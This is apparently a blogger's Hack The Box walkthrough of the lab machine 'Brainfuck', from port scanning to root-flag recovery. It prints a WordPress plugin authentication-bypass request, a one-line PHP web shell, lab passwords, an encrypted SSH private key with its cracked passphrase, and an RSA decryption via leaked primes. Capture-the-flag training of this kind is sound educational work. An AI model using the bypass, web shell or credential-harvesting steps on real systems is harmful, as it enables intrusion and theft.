---
layout: post
title: "HTB: BRAINFUCK (10.10.10.17)"
description: "Brainfuck is an Insane Linux Box from Hack The Box which hosts a wordpress site with a vulnerable plugin which allows for authentication bypass. In root we dont actually get shell on the box but we are able to read the root flag by breaking RSA."
tags: [Brainfuck, Insane, Wordpress, RSA, htb, boxes, wpscan, python, SMTP, IMAP, POP3, https, subdomain, John, ssh2john, ctf, crypto, nmap, vulnerable-plugin, auth-bypass]
image: "/assets/img/brainfuck/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```Shell
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/all_ports 10.10.10.17
[sudo] password for george:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-23 22:28 EAT
Nmap scan report for 10.10.10.17
Host is up (0.49s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 29.12 seconds

┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ sudo nmap -sC -sV -p22,25,110,143,443 -oA nmap/brainfuck 10.10.10.17
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-23 22:29 EAT
Nmap scan report for 10.10.10.17
Host is up (0.37s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL(PLAIN) USER CAPA PIPELINING UIDL TOP AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: IDLE ENABLE post-login more have Pre-login LITERAL+ ID OK SASL-IR capabilities IMAP4rev1 listed AUTH=PLAINA0001 LOGIN-REFERRALS
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
| tls-nextprotoneg:
|_  http/1.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.28 seconds
```
Judging by the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version in use, it is probable that the host is operating on Ubuntu 16.04 Xenial. The TLS certificate contains a significant amount of information.

## Port Enumeration

### Port 443
#### brainfuck.htb

Visiting `www.brainfuck.htb` redirects to `brainfuck.htb` which looks like its build on wordpress.

![brainfuck.htb](/assets/img/brainfuck/brainfuck_homepage.png)

To be sure its actually `wordpress` and not a decoy i will visit `wp-admin` as this is the default admin login page for any `wordpress` site.

![wp-admin](/assets/img/brainfuck/wp-admin.png)

Also we are able to pick up an email address `orestis@brainfuck.htb`

#### Wordpress Vuln Check

Since we are sure this is a wordpress site, instead of running directory bruteforce, lets run `wpscan`. The box is quite old hence we are sure to get a tonn of vulnerabilities hence we will ignore anything on the wordpress core

```
┌─[✗]─[george@parrot]─[~/HTB/boxes/brainfuck]                  
└──╼ $ wpscan --url https://brainfuck.htb --enumerate ap --disable-tls-checks
_______________________________________________________________
         __          _______   _____                           
         \ \        / /  __ \ / ____|                 
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                         
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \   
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                         

         WordPress Security Scanner by the WPScan Team                                                                         
                         Version 3.8.24                 
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                         
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n       
[+] URL: https://brainfuck.htb/ [10.10.10.17]                  
[+] Started: Sun Sep 24 11:24:18 2023   

..........snip........
[i] Plugin(s) Identified:                                      

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |                                                             
 | Found By: Urls In Homepage (Passive Detection)
 |                                                             
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

```
The `wp-support-plus-responsive-ticket-system` stands out since when the box was released the current version was `8.0.7`.

#### sup3rs3cr3t.brainfuck.htb

Visiting this subdomain, it opens a `super secret forum` which has a `signup` `login` and a thread discussion which doesnt give much.

![wp-admin](/assets/img/brainfuck/secret_web_page.png)

I createed an account to see if i can find anything interesting as an authenticated user but there was nothing

![wp-admin](/assets/img/brainfuck/account.png)

One name keeps poping up on these sites and that is `orestis`. Must be an important person :)

### port 25

Connecting to smtp using telnet is a success and we are able to verify user `orestis` but not `admin`

```Sh
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ telnet 10.10.10.17 25
Trying 10.10.10.17...
Connected to 10.10.10.17.
Escape character is '^]'.
220 brainfuck ESMTP Postfix (Ubuntu)
HELO
501 Syntax: HELO hostname
HELO B
250 brainfuck
VRFY orestis
252 2.0.0 orestis

```
## Initial access
### Auth as admin

I will check for any vulnerability on the `wp support plus` plugin version from `searchsploit`.

```
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ searchsploit wp support plus
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                                                                                                                    | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                                                                                                                      | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                                                                                                                             | php/webapps/40939.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
Lets check out the Privilage Escalation first

```
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ searchsploit -x php/webapps/41006.txt

# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
# Date: 10-01-2017
# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: web

1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>

Then you can go to admin panel.
```
Key take alway:

  You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

Cool Lets try it out.

The POC is a page which will help generate the correct POST request. I will modify it to put in the correct details.

I will proxy this to `BurpSuite` so that i can see whats happening behind the scenes

The `html` page generates a POST request as below

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: brainfuck.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&email=sth&action=loginGuestFacebook
```
Intercepting the response to this `POST` shows it setting a bunch of cookies.

```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sun, 24 Sep 2023 09:57:10 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Set-Cookie: wordpress_sec_4a881878556bfa5bb532816568f34de7=admin%7C1695722230%7CvXxgTW4a0vpzSpdhkUT9vIqN40TGXIMUwm1s5VYhrkp%7Cf2734b63f489b780c59a4728b1c790d0dce3919bb57969a09a4bab0d4604c64d; path=/wp-content/plugins; secure; HttpOnly
Set-Cookie: wordpress_sec_4a881878556bfa5bb532816568f34de7=admin%7C1695722230%7CvXxgTW4a0vpzSpdhkUT9vIqN40TGXIMUwm1s5VYhrkp%7Cf2734b63f489b780c59a4728b1c790d0dce3919bb57969a09a4bab0d4604c64d; path=/wp-admin; secure; HttpOnly
Set-Cookie: wordpress_logged_in_4a881878556bfa5bb532816568f34de7=admin%7C1695722230%7CvXxgTW4a0vpzSpdhkUT9vIqN40TGXIMUwm1s5VYhrkp%7Cde6925285badc4eec9f36be9e79b89fa98ea3c298860b76df37d52d10885540a; path=/; secure; HttpOnly
Content-Length: 0
```
The site loads an empty page but on visiting the main page we see the admin pannel appear. Cool we now have access to the admin page.

![wp-admin](/assets/img/brainfuck/admin_access.png)

### RCE Test

At this point I figured out why not test for an Remote Code Execution. Below is what i tried.

#### Plugin Upload

I created a new plugin and named it as george.php

```
<?php
 /*
 Plugin Name: george Plugin
 Version: 1.0.0
 Author: george
 Author URI: wordpress.org
 License: GPL2
 */
system($_REQUEST["george"]);
?>
```
Now i will add this to a zip file and upload it to wordpress. This fails with the error directory not writeable

![Plugin Upload](/assets/img/brainfuck/unable.png)

#### Plugin Edit

I tried to edit a plugin but it also has the same permission denied message.

#### Theme edit

This also has permission denied. Seems the admin made it that the user running the webserver cannot edit any of the wordpress files.

### Finding orestis' credentials
#### SMTP plugin

While on the plugin page, I noticed a particular plugin of intrest `Easy WP SMTP`.

 ![Plugin](/assets/img/brainfuck/plugin.png)

Reasons for taking a keen intrest in this plugin :

- The blog posts were talking about SMTP integrations
- With SMTP integrations there is always a chance of finding credentials.

True enough when I go the settings, I see a username and password.

 ![Username & Password](/assets/img/brainfuck/usename.png)

I can reveal the password by using dev tools on firefox to change the input type of the password field

 ![Password](/assets/img/brainfuck/password.png)

 Now we have a potential username `orestis` and password `kHGuERB29DNiNE`

### Email access

With the smtp credentials obtained, we can login to `orestis'` email and see what we can get.

I dont have any mail client installed on my box hence I will just use the command line

```
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ telnet 10.10.10.17 110
Trying 10.10.10.17...
Connected to 10.10.10.17.
Escape character is '^]'.
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
```
We can see he has 2 emails in his mailbox

```
LIST
+OK 2 messages:
1 977
2 514
.
RETR 1
+OK 977 octets
Return-Path: <www-data@brainfuck.htb>
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/
.
RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```
And we find another set of credentials for `orestis` password `kIEnnfEKJ#9UmdO` for the secret forum.

### Shell as Orestis
#### Forum enumeration

Using the credentials, I will log into the secret forum and poke around. I see there are two new threads.

 ![Logged in Secret Formun](/assets/img/brainfuck/secret_login.png)

Thread one `SSH Access` has a conversation between `orestis` and an `admin`

 ![Thread One](/assets/img/brainfuck/ssh_access.png)

One thin i notice here is Orestis conversations seems to have a signature block that he uses in his post `Orestis - Hacking for fun and profit`

Thread two looks like gibberish. In the first thread orestis said he is opening an encrypted chat. This is it

 ![Thread Two](/assets/img/brainfuck/thread2.png)

On this chat, I notice a pattern on Orestis posts. Each posts end with the same structure, 7 letter word, dash, 7 letter word, three 3 letter words, and a 6 letter word

#### Decryption key

As am no pro in crypto, I did a few research and talking to people on the HTB forums for help. I was pointed to this site [One time Pad](https://rumkin.com/tools/cipher/one-time-pad/)

On visiting the site this *A virtually uncrackable cipher that relies heavily upon a random source for an encryption key.* captures my attention.

Thinking back to Thread one, orestis had a particular message block on all his chat. I will use that as the pad and take one of the encrypted block to test.

During testing I had to remove the spaces and dashes in the encypted message for it to make sense

 ![Decryption Key](/assets/img/brainfuck/encryptionkey.png)

The key is one of the following

- `fuckmybrain`
- `mybrainfuck`
- `brainfuckmy`

#### Decrypting The message

Testing out the three options, I find the correct key to be `fuckmybrains`.

 ![Decrypted Message](/assets/img/brainfuck/decrypted.png)

The full message goes like

```
orestis: Hey give me the url for my key bitch :)
admin: Say please and i just might do so…
orestis: Pleeeease….
admin: There you go you stupid fuck, I hope you remember your key password because I dont :)
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
orestis: No problem, I’ll brute force it ;)
```
#### SSH Access

We can now download the ssh key and gain our foothold on the box.

```
─[✗]─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ wget https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
--2023-09-24 16:34:21--  https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
Resolving brainfuck.htb (brainfuck.htb)... 10.10.10.17
Connecting to brainfuck.htb (brainfuck.htb)|10.10.10.17|:443... connected.
WARNING: The certificate of ‘brainfuck.htb’ is not trusted.
WARNING: The certificate of ‘brainfuck.htb’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘brainfuck.htb’
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa                                                          100%[=====================================================================================================================================================>]   1.72K  --.-KB/s    in 0s      

2023-09-24 16:34:23 (10.2 MB/s) - ‘id_rsa’ saved [1766/1766]
```
But wait.. one problem, the key is encrypted, we will need to tbruteforce it as Orestis suggested.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----

```
for this I will use `ssh2john` to generate a hash and crack it with `john`

```
┌─[✗]─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:19 DONE (2023-09-24 16:55) 0.05047g/s 723962p/s 723962c/s 723962C/sa6_123..*7¡Vamos!
Session completed
```
### Jackpot

We cracked the key as `3poulakia!`. With that we can now access the box.

```
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ chmod 600 id_rsa

┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ ssh -i id_rsa orestis@10.10.10.17
The authenticity of host '10.10.10.17 (10.10.10.17)' can't be established.
ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.17' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
orestis@brainfuck:~$
```
And grab our `user` flags

```
orestis@brainfuck:~$ cat user.txt
2c11cfbc5b959f*********************
orestis@brainfuck:~$
```
## Root

### Digging deeper

On orestis' home directly, I see other files.

```
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
```
- `mail` is a directory which is empty
- `debug.txt` &  `output.txt` have long numbers and the latter has a label `Encrypted Password`

Encrypt.sage has something that looks like a script similar to python

```
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
encrypt.sage (END)
```
At this point I was stuck. So i decided to consult `chatgpt` and i got below explanation.

*This code essentially demonstrates the process of generating an RSA key pair (public and private keys), encrypting a password using the public key (n and e), and saving the encrypted password and some key information to files for further use or analysis.*

It also mentioned something about [`SageMath`](https://en.wikipedia.org/wiki/SageMath)

Back to the script

It begins by importing the content of "root.txt" and stores it as a variable called "password." Afterward, it transforms this text into a single, substantial integer. Subsequently, it generates a set of other integers, namely p, q, n, phi, and e, which are crucial components of the RSA encryption method.
Using the message along with e and n, it computes the value of c, which is the outcome of the RSA encryption process. This resulting encrypted data is then saved in "output.txt," while the values of p, q, and e are written to "debug.txt."

### Messing With RSA

For RSA to be secure, p and q must be kept secret. With access to p, q, and e, calculating d (the decryption key) is trivial.

Looking around the internet, I found this python script on [Stackexchange](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)

I modified the script to add our variables from the txt files

Executing the script, I get plaintext as large integers.

```
┌─[george@parrot]─[~/HTB/boxes/brainfuck]
└──╼ $ python rsa.py
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750

```
Converting the Decimal to Hexadecimal

![Decimal to Hexadecimal](/assets/img/brainfuck/decimal.png)

Converting the Hexadecimal to String gives us the root flags

![Root Flag](/assets/img/brainfuck/string.png)

And thats the box. Unfortunately there's no way to get shell from this method

Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
